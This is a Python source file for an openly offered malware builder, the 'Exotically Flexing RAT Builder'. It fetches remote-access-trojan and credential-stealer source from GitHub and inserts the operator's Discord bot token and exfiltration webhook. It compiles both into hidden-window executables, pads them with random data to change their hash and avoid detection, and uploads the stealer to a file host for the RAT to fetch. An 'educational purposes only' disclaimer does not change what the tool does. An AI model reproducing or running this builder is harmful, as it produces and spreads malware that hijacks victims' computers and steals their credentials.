import hashlib
import os
import random
import shutil
import subprocess
import sys
import requests
import platform
from colorama import init, Fore, Style

# Initialize colorama
init()

def print_banner():
    """Print the application banner."""
    banner = f"""
    {Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
    ║ {Fore.CYAN}███████╗██╗  ██╗ ██████╗ ████████╗██╗ ██████╗ █████╗ ██╗     ██╗  ██╗{Fore.RED} ║
    ║ {Fore.CYAN}██╔════╝╚██╗██╔╝██╔═══██╗╚══██╔══╝██║██╔════╝██╔══██╗██║     ╚██╗██╔╝{Fore.RED} ║
    ║ {Fore.CYAN}█████╗   ╚███╔╝ ██║   ██║   ██║   ██║██║     ███████║██║      ╚███╔╝ {Fore.RED} ║
    ║ {Fore.CYAN}██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║██║     ██╔══██║██║      ██╔██╗ {Fore.RED} ║
    ║ {Fore.CYAN}███████╗██╔╝ ██╗╚██████╔╝   ██║   ██║╚██████╗██║  ██║███████╗██╔╝ ██╗{Fore.RED} ║
    ║ {Fore.CYAN}╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED} ║
    ║                                                                       ║
    ║ {Fore.GREEN}Exotically Flexing RAT Builder                                       {Fore.RED} ║
    ║ {Fore.YELLOW}Created by: dead exotic & hoa                                        {Fore.RED} ║
    ║ {Fore.CYAN}https://github.com/deadexotic                                        {Fore.RED} ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def check_requirements():
    """Check and install required modules if needed."""
    required_modules = ['discord.py', 'pycaw', 'comtypes', 'requests', 'pyinstaller', 'colorama']
    missing_modules = []
    
    for module in required_modules:
        try:
            if module == 'discord.py':
                __import__('discord')
            else:
                __import__(module.split('.', maxsplit=1)[0])
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"{Fore.RED}[!] Missing required modules: {', '.join(missing_modules)}")
        install = input(f"{Fore.YELLOW}[?] Do you want to install them now? (y/n): {Style.RESET_ALL}")
        if install.lower() == 'y':
            for module in missing_modules:
                print(f"{Fore.CYAN}[*] Installing {module}...{Style.RESET_ALL}")
                subprocess.run([sys.executable, "-m", "pip", "install", module], check=False)
            print(f"{Fore.GREEN}[+] All required modules installed successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Please install the required modules and try again.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return False
    return True

def check_curl():
    """Check if curl is installed and install if needed."""
    try:
        subprocess.run(["curl", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        return True
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] curl not found on your system.{Style.RESET_ALL}")
        if platform.system() == "Windows":
            install = input(f"{Fore.YELLOW}[?] Do you want to install curl? (y/n): {Style.RESET_ALL}")
            if install.lower() == 'y':
                try:
                    print(f"{Fore.CYAN}[*] Attempting to install curl using winget...{Style.RESET_ALL}")
                    subprocess.run(["winget", "install", "curl"], check=False)
                    return True
                except FileNotFoundError:
                    print(f"{Fore.RED}[!] Could not install curl automatically.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        return False

def download_rat_source():
    """Download the RAT source code from GitHub."""
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaa"
    try:
        print(f"{Fore.CYAN}[*] Downloading RAT source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("rat_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] RAT source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error using main.py as fallback: {str(e)}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading RAT source code: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e2:
            print(f"{Fore.RED}[!] Error using main.py as fallback: {str(e2)}{Style.RESET_ALL}")
            return False

def download_stealer_source():
    """Download the Stealer source code from GitHub."""
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbbbbbb"
    try:
        print(f"{Fore.CYAN}[*] Downloading Stealer source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("stealer_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] Stealer source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download Stealer source code. Status code: {response.status_code}{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading Stealer source code: {str(e)}{Style.RESET_ALL}")
        return False

def insert_token(token):
    """Insert the Discord bot token into the RAT source code."""
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find the appropriate line to insert the token
        token_line_index = -1
        for i, line in enumerate(lines):
            if "token = " in line or "TOKEN = " in line:
                token_line_index = i
                break
        
        # If token line found, replace it; otherwise insert at line 18
        if token_line_index != -1:
            lines[token_line_index] = f"token = '{token}'\n"
        elif len(lines) >= 18:
            lines.insert(18, f"token = '{token}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"token = '{token}'\n")
            
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Token inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
        return False

def insert_webhook(webhook):
    """Insert the webhook URL into the stealer source code."""
    if not webhook:
        print(f"{Fore.YELLOW}[*] No webhook provided, using default webhook.{Style.RESET_ALL}")
        return True
        
    try:
        with open("stealer_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find the appropriate line to insert the webhook
        webhook_line_index = -1
        for i, line in enumerate(lines):
            if "wbhk = " in line:
                webhook_line_index = i
                break
        
        # If webhook line found, replace it; otherwise insert at line 36
        if webhook_line_index != -1:
            lines[webhook_line_index] = f"wbhk = '{webhook}'\n"
        elif len(lines) >= 36:
            lines.insert(36, f"wbhk = '{webhook}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"wbhk = '{webhook}'\n")
            
        with open("stealer_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Webhook inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting webhook: {str(e)}{Style.RESET_ALL}")
        return False

def upload_to_0x0(file_path):
    """Upload a file to 0x0.st and return the URL."""
    print(f"{Fore.CYAN}[*] Uploading {file_path} to 0x0.st...{Style.RESET_ALL}")
    
    # Try using curl if available
    if check_curl():
        try:
            result = subprocess.run(
                ["curl", "-F", f"file=@{file_path}", "https://0x0.st"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False
            )
            if result.returncode == 0 and result.stdout.strip().startswith("https://"):
                return result.stdout.strip()
            print(f"{Fore.YELLOW}[!] curl failed, falling back to Python requests.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error using curl: {str(e)}, falling back to Python requests.{Style.RESET_ALL}")
    
    # Fallback to Python requests
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post('https://0x0.st', files=files)
        
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f"{Fore.RED}[!] Failed to upload file. Status code: {response.status_code}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[!] Error uploading file: {str(e)}{Style.RESET_ALL}")
        return None

def compile_stealer(output_name):
    """Compile the stealer source code into an executable and upload to 0x0.st."""
    try:
        print(f"{Fore.CYAN}[*] Compiling stealer...{Style.RESET_ALL}")
        
        # Check if stealer_source.py exists
        if not os.path.exists("stealer_source.py"):
            print(f"{Fore.RED}[!] stealer_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return None
        
        # Add random data to the executable to change hash
        with open("random_data_stealer.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        stealer_output = f"{output_name}_stealer"
        
        # PyInstaller command with anti-detection options (removed --key option)
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--add-data", f"random_data_stealer.txt{os.pathsep}.",
            "--name", stealer_output,
            "stealer_source.py"
        ]
        
        # Run PyInstaller
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        
        if process.returncode != 0:
            print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
            return None
        
        # Check if the executable was created
        exe_path = os.path.join("dist", f"{stealer_output}.exe")
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{stealer_output}.exe")
            print(f"{Fore.GREEN}[+] Stealer compiled successfully! Output: {stealer_output}.exe{Style.RESET_ALL}")
            
            # Upload to 0x0.st
            url = upload_to_0x0(f"{stealer_output}.exe")
            if url:
                print(f"{Fore.GREEN}[+] Stealer uploaded to: {url}{Style.RESET_ALL}")
                return url
            else:
                print(f"{Fore.RED}[!] Failed to upload stealer to 0x0.st{Style.RESET_ALL}")
                return None
        
        print(f"{Fore.RED}[!] Stealer compilation completed but executable not found.{Style.RESET_ALL}")
        return None
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling stealer: {str(e)}{Style.RESET_ALL}")
        return None
    finally:
        # Clean up
        try:
            shutil.rmtree("build", ignore_errors=True)
            shutil.rmtree("dist", ignore_errors=True)
            if os.path.exists(f"{stealer_output}.spec"):
                os.remove(f"{stealer_output}.spec")
            if os.path.exists("random_data_stealer.txt"):
                os.remove("random_data_stealer.txt")
            if os.path.exists("stealer_source.py"):
                os.remove("stealer_source.py")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Warning: Could not clean up some stealer files: {str(e)}{Style.RESET_ALL}")

def insert_stealer_link(link):
    """Insert the stealer link into the RAT source code."""
    if not link:
        return False
        
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find line 21 or 22 to insert the link
        if len(lines) >= 22:
            lines.insert(21, f"link = '{link}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"link = '{link}'\n")
            
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Stealer link inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting stealer link: {str(e)}{Style.RESET_ALL}")
        return False

def compile_rat(output_name, icon_path=None):
    """Compile the RAT source code into an executable."""
    try:
        print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
        
        # Check if rat_source.py exists
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return False
        
        # Add random data to the executable to change hash
        with open("random_data.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        # PyInstaller command with anti-detection options 
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--add-data", f"random_data.txt{os.pathsep}.",
            "--name", output_name,
        ]
        
        # Add icon if provided
        if icon_path and os.path.exists(icon_path):
            cmd.extend(["--icon", icon_path])
        
        cmd.append("rat_source.py")
        
        # Run PyInstaller
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        
        if process.returncode != 0:
            print(f"{Fore.RED}[!] Compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
            return False
        
        # Check if the executable was created
        exe_path = os.path.join("dist", f"{output_name}.exe")
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{output_name}.exe")
            print(f"{Fore.GREEN}[+] RAT compiled successfully! Output: {output_name}.exe{Style.RESET_ALL}")
            
            # Clean up
            try:
                shutil.rmtree("build", ignore_errors=True)
                shutil.rmtree("dist", ignore_errors=True)
                if os.path.exists(f"{output_name}.spec"):
                    os.remove(f"{output_name}.spec")
                if os.path.exists("random_data.txt"):
                    os.remove("random_data.txt")
                if os.path.exists("rat_source.py"):
                    os.remove("rat_source.py")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Warning: Could not clean up some files: {str(e)}{Style.RESET_ALL}")
            
            return True
        
        print(f"{Fore.RED}[!] Compilation completed but executable not found.{Style.RESET_ALL}")
        return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling RAT: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    """Main function to run the RAT builder."""
    print_banner()
    
    print(f"{Fore.CYAN}[*] Checking requirements...{Style.RESET_ALL}")
    if not check_requirements():
        return
    
    print(f"\n{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] The authors are not responsible for any misuse or damage caused by this program.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] By continuing, you agree that you will use this responsibly and legally.{Style.RESET_ALL}\n")
    
    agree = input(f"{Fore.YELLOW}[?] Do you agree? (y/n): {Style.RESET_ALL}")
    if agree.lower() != 'y':
        print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
        return
    
    # Get Discord bot token
    token = input(f"{Fore.YELLOW}[?] Enter your Discord bot token: {Style.RESET_ALL}")
    if not token:
        print(f"{Fore.RED}[!] Token cannot be empty.{Style.RESET_ALL}")
        return
    
    # Get webhook (optional)
    webhook = input(f"{Fore.YELLOW}[?] Enter your webhook URL (optional, press Enter to skip): {Style.RESET_ALL}")
    
    # Get output name
    output_name = input(f"{Fore.YELLOW}[?] Enter output file name (default: ExoticallyFlexing): {Style.RESET_ALL}")
    if not output_name:
        output_name = "ExoticallyFlexing"
    
    # Get icon path (optional)
    icon_path = input(f"{Fore.YELLOW}[?] Enter path to custom icon file (optional, press Enter to skip): {Style.RESET_ALL}")
    if icon_path and not os.path.exists(icon_path):
        print(f"{Fore.YELLOW}[!] Icon file not found, using default icon.{Style.RESET_ALL}")
        icon_path = None
    
    # Download RAT source
    if not download_rat_source():
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Insert token
    if not insert_token(token):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Process stealer if webhook provided
    stealer_link = None
    if webhook:
        # Download stealer source
        if download_stealer_source():
            # Insert webhook
            if insert_webhook(webhook):
                # Compile stealer and upload to 0x0.st
                stealer_link = compile_stealer(output_name)
                if stealer_link:
                    # Insert stealer link into RAT source
                    insert_stealer_link(stealer_link)
    
    # Compile RAT
    if not compile_rat(output_name, icon_path):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}[+] Build completed successfully!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Your RAT is ready: {output_name}.exe{Style.RESET_ALL}")
    if stealer_link:
        print(f"{Fore.GREEN}[+] Stealer uploaded to: {stealer_link}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[i] Thanks for using Exotically Flexing RAT Builder!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] Created by dead exotic & hoa{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] GitHub: https://github.com/deadexotic{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
